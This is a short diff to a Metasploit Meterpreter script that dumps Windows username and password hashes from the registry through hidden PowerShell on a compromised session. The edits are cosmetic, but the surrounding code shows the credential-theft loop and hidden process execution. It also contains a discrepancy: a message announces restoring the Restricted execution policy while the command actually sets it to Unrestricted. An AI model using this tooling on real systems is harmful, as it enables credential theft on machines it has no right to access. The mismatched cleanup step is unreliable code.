@@ -1,4 +1,5 @@
 # $Id$
+# $Revision$
 #
 # Meterpreter script for utilizing purely PowerShell to extract username and password hashes through registry
 # keys. This script requires you to be running as system in order to work properly. This has currently been
@@ -46,12 +47,12 @@ def dumphash(session)
 	begin
 		while ((data = hashes.read) != nil)
 			data=data.strip
-			puts(data)
+			print_line(data)
 		end
 	rescue EOFError
 	ensure
 		hashes.close
-	end 
+	end
 	print_status("Setting Execution policy back to Restricted...")
 	session.sys.process.execute("powershell Set-ExecutionPolicy Unrestricted", nil, {'Hidden' => 'true', 'Channelized' => true})
 	print_status("Cleaning up after ourselves...")
